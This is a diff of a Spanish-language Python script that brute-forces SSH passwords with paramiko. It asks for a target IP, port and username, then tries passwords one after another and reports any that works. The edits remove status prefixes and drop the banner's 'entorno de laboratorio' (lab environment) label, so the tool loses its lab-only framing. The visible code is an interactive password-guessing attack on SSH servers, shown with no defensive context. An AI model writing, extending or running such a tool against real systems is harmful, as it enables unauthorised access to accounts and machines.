@@ -5,7 +5,7 @@ import logging
 try:
     import paramiko
 except ImportError:
-    print("[!] Paramiko no está instalado. Instala con: pip install paramiko")
+    print("Paramiko no está instalado. Instala con: pip install paramiko")
     sys.exit(1)
 
 logging.basicConfig(
@@ -55,7 +55,7 @@ def try_password(host, port, username, password, timeout=5):
 
 
 def interactive_main():
-    print("\n=== Brute-force SSH (modo interactivo, entorno de laboratorio) ===\n")
+    print("\nBrute-force SSH\n")
 
     host = input("IP objetivo: ").strip()
     # permitir que el usuario presione Enter para usar el puerto por defecto 22
@@ -77,15 +77,16 @@ def interactive_main():
             print(f"Probando: {password}")
             ok = try_password(host, port, username, password)
             if ok:
-                print(f"[+] Contraseña encontrada: {password}")
+                print(f"Contraseña encontrada: {password}")
                 break
             # pequeño retardo para evitar sobrecarga
             time.sleep(0.5)
         else:
-            print("[-] Ninguna contraseña coincidió")
+            print("Ninguna contraseña coincidió")
     except KeyboardInterrupt:
-        print("\n[!] Interrumpido por el usuario")
+        print("\nInterrumpido por el usuario")
 
 
 if __name__ == "__main__":
     interactive_main()
+
